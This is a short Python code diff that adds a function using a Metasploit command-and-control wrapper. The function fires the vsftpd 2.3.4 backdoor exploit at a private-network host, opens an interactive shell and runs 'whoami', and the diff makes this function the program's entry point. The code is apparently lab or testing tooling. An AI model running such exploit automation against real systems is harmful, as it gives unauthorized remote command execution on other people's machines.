@@ -16,5 +16,13 @@ def main():
     shell.write('whoami')
     print(shell.read())
 
+def main2():
+    server = MetasploitC2("192.168.254.95", "test")
+    client = MetasploitShell(1, server)
+    exploit = server.metasploitServer.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
+    exploit['RHOSTS'] = '192.168.13.28'
+    output = exploit.execute(payload='cmd/unix/interact')
+    print(output)
+    print(client.executeShell("whoami"))
 
-main()
+main2()
